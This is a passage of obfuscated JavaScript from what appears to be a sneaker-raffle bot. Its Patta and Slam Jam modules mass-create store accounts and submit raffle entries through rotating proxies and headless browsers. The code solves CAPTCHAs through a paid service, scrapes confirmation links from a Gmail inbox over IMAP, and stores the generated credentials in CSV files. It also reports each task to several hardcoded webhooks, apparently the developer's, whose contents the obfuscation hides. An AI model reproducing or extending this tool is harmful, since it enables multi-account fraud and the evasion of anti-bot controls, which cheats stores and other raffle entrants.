                            'user': _0x5e160d['masterMail'],
                            'password': _0x5e160d['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5a5201(_0x361ede) {
                            _0x41f760['openBox']('INBOX', ![], _0x361ede);
                        }
                        _0x41f760['once']('ready', function () {
                            _0x5a5201(function (_0x5e7327, _0x2e840a) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5e7327)
                                    throw _0x5e7327;
                                _0x41f760['seq']['search'](['UNSEEN'], function (_0x4d70a5, _0x4fb242) {
                                    if (!_0x4fb242 || !_0x4fb242['length'])
                                        console['log'](_0x21c871() + '\x20[' + _0x9ebd4b['name'] + ']\x20No\x20mails\x20found'), _0x41f760['end']();
                                    else {
                                        var _0xdbd85 = _0x41f760['seq']['fetch'](_0x4fb242, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xdbd85['on']('message', function (_0x53ef99, _0x270fcc) {
                                            var _0x4a5550 = '(#' + _0x270fcc + ')\x20';
                                            _0x53ef99['on']('body', function (_0x125751, _0x596189) {
                                                _0x31366c(_0x125751, (_0x2c1770, _0x237e56) => {
                                                    if (_0x237e56['subject'] == 'Confirm\x20Your\x20Subscription' && _0x237e56['from']['value'][0x0]['name'] == 'OQIUM') {
                                                        var _0x4104db = _0x237e56['text']['split']('(')[0x1], _0x23bd55 = _0x4104db['split'](')')[0x0];
                                                        _0x5c9213['push'](_0x23bd55);
                                                    }
                                                });
                                            }), _0x53ef99['once']('end', function () {
                                            });
                                        }), _0xdbd85['once']('error', function (_0x4778f2) {
                                            console['log']('Fetch\x20error:\x20' + _0x4778f2);
                                        }), _0xdbd85['once']('end', function () {
                                            _0x41f760['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x41f760['once']('error', function (_0x38adbe) {
                            console['log'](_0x38adbe);
                        }), _0x41f760['once']('end', async function () {
                        }), _0x41f760['connect']();
                    }
                    async function _0x52d414(_0x4dfb1d, _0x56ee84, _0x4fa160) {
                        for (var _0x42284b = 0x0; _0x42284b < _0x56ee84['length']; _0x42284b++) {
                            async function _0x5643e4(_0x52649, _0x2e17c0, _0x1c058f, _0x4a7554, _0x42ff82) {
                                var _0x20438c, _0xf7a00e = {}, _0x1715bc = [], _0x3b1563 = {}, _0x32aa47 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x10e8a5 = Math['round'](Math['random']() * (_0x32aa47['length'] - 0x1));
                                _0x4a7554[_0x52649]['Size'] == 'RANDOM' && (_0x4a7554[_0x52649]['Size'] = _0x32aa47[_0x10e8a5]);
                                !_0x4a7554 && (_0x4a7554 = {});
                                if (_0x5e160d['useRandomProxy'] = ![])
                                    var _0xa3cfab = _0x42ff82[_0x52649]['split'](':');
                                else
                                    var _0x275a9b = Math['round'](Math['random']() * (_0x42ff82['length'] - 0x1)), _0xa3cfab = _0x42ff82[_0x275a9b]['split'](':');
                                var _0x20eef9 = {
                                    'jar': _0xe4a440,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1c058f['url'],
                                    'headers': _0x1c058f['headers'],
                                    'body': JSON['stringify'](_0xf7a00e),
                                    'proxy': 'http://' + _0xa3cfab[0x2] + ':' + _0xa3cfab[0x3] + '@' + _0xa3cfab[0x0] + ':' + _0xa3cfab[0x1]
                                };
                                return _0x2e17c0 != 'ver' && (_0x20eef9['url'] = _0x1c058f['url'], _0x20eef9['headers'] = _0x1c058f['headers']), _0x2e17c0 == 'ver' && (_0x20eef9['method'] = 'GET', _0x20eef9['url'] = _0x4a7554[_0x52649]), new Promise(function (_0x47012b, _0xccc80e) {
                                    callback = async (_0x16f732, _0x52efa0, _0x46f1e7) => {
                                        if (!_0x16f732 && _0x52efa0['statusCode'] == 0xca || !_0x16f732 && _0x52efa0['statusCode'] == 0xc8) {
                                            if (_0x2e17c0 != 'ver') {
                                                var _0x4371b8 = await _0x485032(_0x4a7554[_0x52649], _0x1c058f, 'dev', ![]), _0x468c46 = await _0x485032(_0x4a7554[_0x52649], _0x1c058f, 'pub', ![]);
                                                const _0x412615 = {
                                                    'succesDEVMSG': { 'embeds': [_0x4371b8] },
                                                    'succesPUBMSG': { 'embeds': [_0x468c46] }
                                                };
                                                if (_0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '')
                                                    try {
                                                        await _0x16a920(_0x5e160d['webhook'], _0x412615['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x412615['succesDEVMSG']), await _0x38c39e(0xc8);
                                                try {
                                                    await _0x16a920(_0x2766d4, _0x412615['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x41f993(_0x4a7554[_0x52649], _0x1c058f);
                                            }
                                            _0x47012b(console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x1c058f['name'] + ']\x20Task\x20' + (_0x52649 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2e17c0 != 'ver') {
                                                var _0x307333 = '' + _0x16f732, _0x2660f5 = await _0x485032(_0x4a7554[_0x52649], _0x1c058f, 'dev', !![], _0x307333), _0x3738ac = {};
                                                _0x3738ac['errorDEV'] = { 'embeds': [_0x2660f5] }, _0x1ac5d5(_0x4a7554[_0x52649], _0x1c058f), _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x3738ac['errorDEV']), await _0x16a920(_0x233d0f, _0x3738ac['errorDEV']);
                                            }
                                            _0xccc80e(console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x1c058f['name'] + ']\x20Task\x20' + (_0x52649 + 0x1) + ':\x20' + _0x16f732)));
                                        }
                                    };
                                    try {
                                        _0x2e17c0 != 'ver' ? console['log'](_0x21c871() + '\x20[' + _0x1c058f['name'] + ']\x20Task\x20' + (_0x52649 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xf7a00e['data']['attributes']['email']) : console['log'](_0x21c871() + '\x20[' + _0x1c058f['name'] + ']\x20Task\x20' + (_0x52649 + 0x1) + ':\x20Fetching\x20Response'), _0x247acd(_0x20eef9, callback);
                                    } catch (_0x4b251c) {
                                        console['log'](_0x21c871() + '\x20Task\x20' + (_0x52649 + 0x1) + ':\x20' + _0x4b251c);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5643e4(_0x42284b, 'ver', _0x4dfb1d, _0x56ee84, _0x4fa160), console['log'](_0x21c871() + '\x20[' + _0x4dfb1d['name'] + ']\x20Sleeping\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                            } catch (_0xde970b) {
                            }
                        }
                    }
                    try {
                        _0x5d6391(), await _0x38c39e(0xfa0), console['log']('Found\x20' + _0x5c9213['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x52d414(_0x9ebd4b, _0x5c9213, _0x5a3d5b);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x39eb64, _0x3ae638, _0x17908b) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2821e9 = 0x0; _0x2821e9 < _0x3ae638['length']; _0x2821e9++) {
                        var _0xb0974c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50a338
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5e160d['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xa56f6b
                                }
                            ]
                        }];
                        const _0x242999 = { 'embeds': _0xb0974c };
                        _0x2ad028(_0x39eb64['name'] + '\x20Task\x20' + (_0x2821e9 + 0x1) + '\x20/\x20' + _0x3ae638['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92), await _0x3962cc(_0x3ae638, _0x2821e9);
                        var _0x5e6aaf = await _0x485032(_0x3ae638[_0x2821e9], _0x39eb64, 'acc', ![]);
                        const _0x4ac3a3 = { 'succesDEVMSG': { 'embeds': [_0x5e6aaf] } };
                        if (_0x3ae638[_0x2821e9]['Email'] == '' || _0x3ae638[_0x2821e9]['FirstName'] == '' || _0x3ae638[_0x2821e9]['LastName'] == '') {
                            console['log'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x2821e9 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x38c39e(0x7d0);
                            continue;
                        }
                        (_0x3ae638[_0x2821e9]['Password'] == '' || _0x3ae638[_0x2821e9] == undefined) && _0x3ae638[_0x2821e9]['Password'] == 'JRaffles23!';
                        if (_0x5e160d['useRandomProxy'] = ![])
                            var _0x2a37e1 = _0x17908b[_0x2821e9]['split'](':');
                        else
                            var _0x1c27e5 = Math['round'](Math['random']() * (_0x17908b['length'] - 0x1)), _0x2a37e1 = _0x17908b[_0x1c27e5]['split'](':');
                        const _0x53b9ac = await _0x3d68d8['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2a37e1[0x0] + ':' + _0x2a37e1[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x1cc08d = await _0x53b9ac['newPage']();
                            await _0x1cc08d['authenticate']({
                                'username': '' + _0x2a37e1[0x2],
                                'password': '' + _0x2a37e1[0x3]
                            }), console['log'](_0x21c871() + '\x20[' + _0x39eb64['name'] + ']\x20Task\x20' + (_0x2821e9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1cc08d['setRequestInterception'](!![]), _0x1cc08d['on']('request', _0x10990a => {
                                _0x10990a['resourceType']() === 'image' || _0x10990a['resourceType']() === 'font' || _0x10990a['resourceType']() === 'media' ? _0x10990a['abort']() : _0x10990a['continue']();
                            }), await _0x1cc08d['goto']('https://patta.nl/account/register'), await _0x38c39e(0xbb8), await _0x1cc08d['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x21c871() + '\x20[' + _0x39eb64['name'] + ']\x20Task\x20' + (_0x2821e9 + 0x1) + '\x20:\x20Filling\x20information'), await _0x1cc08d['type']('#RegisterForm-FirstName', '' + _0x3ae638[_0x2821e9]['FirstName']), await _0x38c39e(0x226), await _0x1cc08d['type']('#RegisterForm-LastName', '' + _0x3ae638[_0x2821e9]['LastName']), await _0x38c39e(0x226), await _0x1cc08d['type']('#RegisterForm-email', '' + _0x3ae638[_0x2821e9]['Email']), await _0x38c39e(0x226), await _0x1cc08d['type']('#RegisterForm-password', '' + _0x3ae638[_0x2821e9]['Password']), await _0x38c39e(0x226), console['log'](_0x21c871() + '\x20[' + _0x39eb64['name'] + ']\x20Task\x20' + (_0x2821e9 + 0x1) + '\x20:\x20Submitting..'), await _0x1cc08d['$eval']('#RegisterForm', _0x2ff6fe => _0x2ff6fe['submit']()), await _0x38c39e(0x1f40);
                            try {
                                await _0x1cc08d['waitForSelector']('.home-page-grid__collection'), await _0x38c39e(0x1f4), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x39eb64['name'] + ']\x20Task\x20' + (_0x2821e9 + 0x1) + '\x20:\x20Account\x20' + _0x3ae638[_0x2821e9]['Email'] + '\x20Generated!')), _0x4d1c4a['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x3ae638[_0x2821e9]['Email'] + ',' + _0x3ae638[_0x2821e9]['Password']), console['log'](_0x52c84d['yellow'](_0x21c871() + '\x20[' + _0x39eb64['name'] + ']\x20Task\x20' + (_0x2821e9 + 0x1) + '\x20:\x20Account\x20' + _0x3ae638[_0x2821e9]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x4ac3a3['succesDEVMSG']);
                                } catch {
                                }
                                await _0x16a920(_0x244950, _0x4ac3a3['succesDEVMSG']);
                            } catch (_0xa495f1) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x2821e9 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0xa495f1));
                            }
                        } catch (_0x58b19b) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x2821e9 + 0x1) + '\x20:\x20' + _0x58b19b));
                        } finally {
                            _0x53b9ac && _0x53b9ac['close'](), console['log']('Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x1e3826, _0x1dda0f, _0x387631) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2f50b3 = 0x0; _0x2f50b3 < _0x1dda0f['length']; _0x2f50b3++) {
                        var _0x327e61;
                        if (_0x49e2db != 'yes')
                            var _0x49e2db = '', _0xed8efc = 0x0;
                        _0x2ad028(_0x1e3826['name'] + '\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20/\x20' + _0x1dda0f['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92), await _0x3962cc(_0x1dda0f, _0x2f50b3);
                        if (_0x1dda0f[_0x2f50b3]['Email'] == '' || _0x1dda0f[_0x2f50b3]['Password'] == '' || _0x1dda0f[_0x2f50b3]['FirstName'] == '' || _0x1dda0f[_0x2f50b3]['LastName'] == '') {
                            console['log'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5e160d['useRandomProxy'] = ![])
                            var _0x342654 = _0x387631[_0x2f50b3]['split'](':');
                        else
                            var _0x3989f1 = Math['round'](Math['random']() * (_0x387631['length'] - 0x1)), _0x342654 = _0x387631[_0x3989f1]['split'](':');
                        const _0x52870d = await _0x3d68d8['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x342654[0x0] + ':' + _0x342654[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x676996 = await _0x52870d['newPage']();
                            await _0x676996['authenticate']({
                                'username': '' + _0x342654[0x2],
                                'password': '' + _0x342654[0x3]
                            }), console['log'](_0x21c871() + '\x20[' + _0x1e3826['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x676996['setRequestInterception'](!![]), _0x676996['on']('request', _0x1a326c => {
                                _0x1a326c['resourceType']() === 'image' || _0x1a326c['resourceType']() === 'font' || _0x1a326c['resourceType']() === 'media' ? _0x1a326c['abort']() : _0x1a326c['continue']();
                            }), await _0x676996['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x676996['waitForSelector']('#CustomerEmail'), console['log'](_0x21c871() + '\x20[' + _0x1e3826['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x676996['type']('#CustomerEmail', '' + _0x1dda0f[_0x2f50b3]['Email']), await _0x38c39e(0x12c), await _0x676996['type']('#CustomerPassword', '' + _0x1dda0f[_0x2f50b3]['Password']), await _0x38c39e(0x226), await _0x676996['$eval']('#customer_login', _0x5c202e => _0x5c202e['submit']());
                            try {
                                await _0x676996['waitForSelector']('#orders'), await _0x38c39e(0x4b0);
                            } catch {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x1e3826['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x676996['goto']('' + _0x1dda0f[_0x2f50b3]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x38c39e(0xbb8), console['log'](_0x21c871() + '\x20[' + _0x1e3826['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x676996['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x1e3826['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x676996['type']('#email', '' + _0x1dda0f[_0x2f50b3]['Email']), await _0x38c39e(0x384), await _0x676996['type']('#first_name', '' + _0x1dda0f[_0x2f50b3]['FirstName']), await _0x38c39e(0x514), await _0x676996['type']('#last_name', '' + _0x1dda0f[_0x2f50b3]['LastName']), await _0x38c39e(0x514), await _0x676996['type']('#street_address', _0x1dda0f[_0x2f50b3]['Address1'] + '\x20' + _0x1dda0f[_0x2f50b3]['HouseNumber'] + '\x20' + _0x1dda0f[_0x2f50b3]['Address2']), await _0x38c39e(0x2bc);
                            _0x1dda0f[_0x2f50b3]['Postcode'] == undefined && (_0x1dda0f[_0x2f50b3]['Postcode'] = _0x1dda0f[_0x2f50b3]['Zip']);
                            await _0x676996['type']('#zip_code', '' + _0x1dda0f[_0x2f50b3]['Postcode']), await _0x38c39e(0x320), await _0x676996['type']('#city', '' + _0x1dda0f[_0x2f50b3]['City']), await _0x38c39e(0x320), await _0x676996['type']('#bday', '01/01/1994'), await _0x38c39e(0x320), await _0x676996['type']('#instagram', '' + _0x1dda0f[_0x2f50b3]['Follower']), await _0x38c39e(0x352);
                            if (_0x1dda0f[_0x2f50b3]['Size'] == 'RANDOM') {
                                const _0x46efc5 = await _0x676996['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x34d6c6 => {
                                    return _0x34d6c6['map'](_0x3b85d2 => _0x3b85d2['textContent']);
                                });
                                var _0x450bef = Math['round'](Math['random']() * (_0x46efc5['length'] - 0x1));
                                console['log'](_0x21c871() + '\x20[' + _0x1e3826['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x46efc5[_0x450bef]), await _0x676996['click']('label[data-eu-size=\x22' + _0x46efc5[_0x450bef] + '\x22]');
                            } else {
                                console['log'](_0x21c871() + '\x20[' + _0x1e3826['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x1dda0f[_0x2f50b3]['Size']);
                                try {
                                    await _0x676996['click']('label[data-eu-size=\x22' + _0x1dda0f[_0x2f50b3]['Size'] + '\x22]');
                                } catch {
                                    await _0x676996['click']('label[data-eu-size=\x22' + _0x1dda0f[_0x2f50b3]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x38c39e(0xbb8), await _0x676996['$$eval']('.raffle__checkbox-label', _0x3b7ae6 => _0x3b7ae6['forEach'](_0x404caf => _0x404caf['click']())), await _0x38c39e(0x7d0), console['log'](_0x21c871() + '\x20[' + _0x1e3826['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x676996['click']('#raffle__form-submit'), await _0x38c39e(0x1388);
                            try {
                                await _0x676996['waitForSelector']('#raffle__confirmation-message-container'), _0x49e2db = 'no', _0x41f993(_0x1dda0f[_0x2f50b3], _0x1e3826), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x1e3826['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x289ee1) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x289ee1));
                            }
                        } catch (_0x4fde2c) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20' + _0x4fde2c)), _0x49e2db = 'yes';
                        } finally {
                            _0x52870d && _0x52870d['close']();
                            if (_0x49e2db == 'yes' && _0xed8efc != 0x5 && _0x327e61 != 'Size\x20Not\x20Found') {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x1e3826['name'] + ']\x20Task\x20' + (_0x2f50b3 + 0x1) + '\x20:\x20Retrying')), _0x2f50b3 = _0x2f50b3 - 0x1, _0xed8efc = _0xed8efc + 0x1;
                                continue;
                            }
                            _0x49e2db == 'yes' && _0xed8efc >= 0x5 && (_0x1ac5d5(_0x1dda0f[_0x2f50b3], _0x1e3826), _0x49e2db = 'no', _0xed8efc = 0x0), console['log']('Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0xbeaf3, _0x528c62, _0x3d761c) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4d661c = 0x0; _0x4d661c < _0x528c62['length']; _0x4d661c++) {
                        if (_0x33b9a8 != 'yes')
                            var _0x33b9a8 = '', _0x312d21 = 0x0;
                        var _0xb322d8 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50a338
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5e160d['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xa56f6b
                                }
                            ]
                        }];
                        const _0x118310 = { 'embeds': _0xb322d8 };
                        _0x2ad028(_0xbeaf3['name'] + '\x20Task\x20' + (_0x4d661c + 0x1) + '\x20/\x20' + _0x528c62['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92), await _0x3962cc(_0x528c62, _0x4d661c);
                        var _0x518e01 = await _0x485032(_0x528c62[_0x4d661c], _0xbeaf3, 'acc', ![]);
                        const _0x54eaac = { 'succesDEVMSG': { 'embeds': [_0x518e01] } };
                        if (_0x528c62[_0x4d661c]['Email'] == '' || _0x528c62[_0x4d661c]['FirstName'] == '' || _0x528c62[_0x4d661c]['LastName'] == '') {
                            console['log'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x38c39e(0x7d0);
                            continue;
                        }
                        (_0x528c62[_0x4d661c]['Password'] == '' || _0x528c62[_0x4d661c] == undefined) && _0x528c62[_0x4d661c]['Password'] == 'JRaffles23!';
                        if (_0x5e160d['useRandomProxy'] = ![])
                            var _0x5b6b99 = _0x3d761c[_0x4d661c]['split'](':');
                        else
                            var _0x423c2a = Math['round'](Math['random']() * (_0x3d761c['length'] - 0x1)), _0x5b6b99 = _0x3d761c[_0x423c2a]['split'](':');
                        const _0x198544 = await _0x3d68d8['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5b6b99[0x0] + ':' + _0x5b6b99[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x4521fc = await _0x198544['newPage']();
                            await _0x4521fc['authenticate']({
                                'username': '' + _0x5b6b99[0x2],
                                'password': '' + _0x5b6b99[0x3]
                            }), console['log'](_0x21c871() + '\x20[' + _0xbeaf3['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4521fc['setRequestInterception'](!![]), _0x4521fc['on']('request', _0x36c086 => {
                                _0x36c086['resourceType']() === 'image' || _0x36c086['resourceType']() === 'font' || _0x36c086['resourceType']() === 'media' ? _0x36c086['abort']() : _0x36c086['continue']();
                            }), await _0x4521fc['goto']('https://drop.slamjam.com/account/register'), await _0x38c39e(0xbb8), await _0x4521fc['waitForSelector']('#FirstName'), await _0x4521fc['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4521fc['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x21c871() + '\x20[' + _0xbeaf3['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20Filling\x20information'), await _0x38c39e(0x4b0), await _0x4521fc['type']('#FirstName', '' + _0x528c62[_0x4d661c]['FirstName']), await _0x38c39e(0x226), await _0x4521fc['type']('#LastName', '' + _0x528c62[_0x4d661c]['LastName']), await _0x38c39e(0x226), await _0x4521fc['type']('#Email', '' + _0x528c62[_0x4d661c]['Email']), await _0x38c39e(0x2ee), await _0x4521fc['type']('#ConfirmEmail', '' + _0x528c62[_0x4d661c]['Email']), await _0x38c39e(0x2ee), await _0x4521fc['type']('#CreatePassword', '' + _0x528c62[_0x4d661c]['Password']), await _0x38c39e(0x2ee), await _0x4521fc['type']('#CreateConfirmPassword', '' + _0x528c62[_0x4d661c]['Password']), await _0x38c39e(0x226), console['log'](_0x21c871() + '\x20[' + _0xbeaf3['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20Submitting..'), await _0x4521fc['$eval']('#create_customer', _0x56f20b => _0x56f20b['submit']()), await _0x38c39e(0x1388), console['log'](_0x21c871() + '\x20[' + _0xbeaf3['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20' + _0x52c84d['cyan']('Solving\x20Captcha')), await _0x4521fc['solveRecaptchas'](), console['log'](_0x21c871() + '\x20[' + _0xbeaf3['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x4521fc['$eval']('.shopify-challenge__container\x20>\x20form', _0xad5c25 => _0xad5c25['submit']());
                            try {
                                await _0x4521fc['waitForSelector']('.product-card__image'), await _0x38c39e(0x1f4), _0x33b9a8 = 'no', console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0xbeaf3['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20Account\x20' + _0x528c62[_0x4d661c]['Email'] + '\x20Generated!')), _0x4d1c4a['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x528c62[_0x4d661c]['Email'] + ',' + _0x528c62[_0x4d661c]['Password']), console['log'](_0x52c84d['yellow'](_0x21c871() + '\x20[' + _0xbeaf3['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20Account\x20' + _0x528c62[_0x4d661c]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x54eaac['succesDEVMSG']);
                                } catch {
                                }
                                await _0x16a920(_0x244950, _0x54eaac['succesDEVMSG']);
                            } catch (_0x348621) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x348621));
                            }
                        } catch (_0xfc8bdb) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20' + _0xfc8bdb));
                        } finally {
                            _0x198544 && _0x198544['close']();
                            if (_0x33b9a8 == 'yes' && _0x312d21 != 0x5) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0xbeaf3['name'] + ']\x20Task\x20' + (_0x4d661c + 0x1) + '\x20:\x20Retrying')), _0x4d661c = _0x4d661c - 0x1, _0x312d21 = _0x312d21 + 0x1;
                                continue;
                            }
                            _0x33b9a8 == 'yes' && _0x312d21 >= 0x5 && (_0x1ac5d5(_0x528c62[_0x4d661c], _0xbeaf3), _0x33b9a8 = 'no', _0x312d21 = 0x0), console['log']('Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
